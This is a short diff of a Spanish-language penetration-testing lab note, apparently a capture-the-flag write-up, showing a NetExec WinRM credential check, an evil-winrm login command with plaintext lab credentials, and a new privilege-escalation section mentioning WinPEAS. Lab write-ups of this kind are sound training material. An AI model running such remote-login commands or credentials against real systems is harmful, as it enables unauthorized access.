@@ -69,9 +69,9 @@ nxc winrm 10.129.9.43 -u 'tony' -p 'liltony'
 ```
 
 Nos conectamos usando [[EVIL-WINRM]]
-```sehll
+```shell
 evil-winrm -i 10.129.9.43 -u 'tony' -p 'liltony'
 ```
 
-
-
+# Escalada de privilegios
+Subiremos el [[WINPEAS]] para hacer una enumeracion completad
